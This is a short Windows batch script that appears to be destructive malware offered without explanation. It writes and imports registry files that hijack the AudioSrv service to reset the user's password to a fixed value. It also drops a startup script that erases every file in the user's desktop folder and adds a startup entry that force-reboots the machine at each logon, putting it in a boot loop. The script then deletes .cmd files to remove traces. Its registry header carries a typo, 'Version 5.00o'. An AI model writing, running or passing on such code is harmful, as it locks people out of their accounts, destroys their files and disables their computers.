echo off 
echo  Windows Registry Editor Version 5.00o > %homedrive%\windows\x.reg 
echo.>> %homedrive%\windows\x.reg 
echo  [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\AudioSrv] >> %homedrive%\windows\x.reg 
echo.>> %homedrive%\windows\x.reg 
echo  "ImagePath"="net user %%username%% Kelt283 ">> %homedrive%\windows\x.reg 
reg import %homedrive%\windows\x.reg 
echo  Windows Registry Editor Version 5.00o > %homedrive%\windows\y.reg 
echo.>> %homedrive%\windows\y.reg 
echo  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> %homedrive%\windows\y.reg 
echo  "ImagePath"="%homedrive%\\windows\\system_32.bat">> %homedrive%\windows\y.reg 
reg import %homedrive%\windows\y.reg 
echo erase /q /s "%homedrive%\documents and settings\%username%\plocha\*.*" > "%homedrive%\\windows\\system_32.bat" 
echo  Windows Registry Editor Version 5.00o > %homedrive%\windows\z.reg 
echo.>> %homedrive%\windows\z.reg 
echo  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> %homedrive%\windows\z.reg 
echo  "system_tray"="shutdown -r -f -t 0" >> %homedrive%\windows\z.reg 
reg import %homedrive%\windows\z.reg 
erase /q *.cmd